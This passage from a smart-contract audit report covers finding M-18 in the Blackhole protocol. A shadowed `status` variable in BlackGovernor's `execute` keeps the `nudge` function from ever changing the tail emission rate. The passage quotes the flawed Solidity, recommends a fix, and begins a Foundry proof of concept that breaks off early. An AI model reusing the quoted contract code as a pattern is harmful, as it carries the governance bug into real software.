class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-56\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-3\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-66\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-18-status-does-not-update-inside-the-blackgovernor-leading-to-complete-distribution-of-nudge-functionality\" style=\"position:relative;\"\u003e\u003ca href=\"#m-18-status-does-not-update-inside-the-blackgovernor-leading-to-complete-distribution-of-nudge-functionality\" aria-label=\"m 18 status does not update inside the blackgovernor leading to complete distribution of nudge functionality permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-162\"\u003e[M-18] Status does not update inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e leading to complete distribution of nudge functionality\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-416\"\u003ehakunamatata\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-173\"\u003edanzero\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-210\"\u003erashmor\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-199\"\u003ermrf480\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L308-L330\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L308-L330\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-6\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-6\" aria-label=\"finding description and impact 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eMinterUpgradeable\u003c/code\u003e has \u003ccode\u003enudge\u003c/code\u003e function that is called by the \u003ccode\u003eBlackGovernor\u003c/code\u003e contract. The nudge function then check the \u003ccode\u003estatus\u003c/code\u003e of the \u003ccode\u003eBlackGovernor\u003c/code\u003e and based on status, updates the \u003ccode\u003etailEmissionRate\u003c/code\u003e of the contract; however, from analyzing the \u003ccode\u003eBlackGovernor\u003c/code\u003e contract (which means also analyzing contracts inside the \u003ccode\u003eGovernor.sol\u003c/code\u003e ), we can see that the \u003ccode\u003estatus\u003c/code\u003e variable \u003cstrong\u003eDOES NOT CHANGE EVER\u003c/strong\u003e. This leads to the fact that even though proposal has succeeded meaning the \u003ccode\u003etailEmissionRate\u003c/code\u003e should be equal to \u003ccode\u003ePROPOSAL_INCREASE\u003c/code\u003e, it goes to else branch and \u003ccode\u003etailEmissionRate\u003c/code\u003e never changes. \u003c/p\u003e\n\u003cp\u003eThis is because the status variable inside \u003ccode\u003eBlackGovernor/Governor\u003c/code\u003e is SHADOWED in the \u003ccode\u003eexecute\u003c/code\u003e function, which can be easily checked using even Solidity Visual Developer extension.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enudge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_epochGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_gaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_epochGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;NA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e//@audit STATUS NEVER GETS UPDATED !!!\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eIBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_state\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_epochGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTAIL_START\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eactive_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_state\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etailEmissionRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePROPOSAL_INCREASE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_state\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDefeated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etailEmissionRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePROPOSAL_DECREASE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etailEmissionRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eproposals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochTimeHash\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epayable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ehashProposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eepochTimeHash\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e//@audit variable is shadowed\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis vulnerability should be High severity, as the core functionality of the protocol is not working. The status is never updated leading to \u003ccode\u003etailEmissionRate\u003c/code\u003e always being the same.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eGet rid of the shadowing and update the status variable.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-13\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThis POC is written in foundry, in order to run it, one has to create foundry project, download dependencies, create remappings and change imports in some of the file to look inside the “src” folder.\u003c/p\u003e\n\u003cp\u003eThe POC is the simple version of the finding, in order to run it one has to first change the code of the Governor, so that other vulnerability in the code is fixed, as without that change proposals DO NOT WORK. Look at the \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-163\"\u003e\u003ccode\u003egetVotes\u003c/code\u003e inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e incorrectly provides \u003ccode\u003eblock.number\u003c/code\u003e instead of \u003ccode\u003eblock.timestamp\u003c/code\u003e, leading to complete DOS of proposal functionality\u003c/a\u003e finding.\u003c/p\u003e\n\u003cp\u003eAlso to see what’s happening one might add \u003ccode\u003econsole.logs\u003c/code\u003e to minter upgradeable and Governor contract that is used inside \u003ccode\u003eBlackGovernor\u003c/code\u003e. We can see that even though the state of the proposal should be \u003ccode\u003eX\u003c/code\u003e, the status variable is always default value.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan 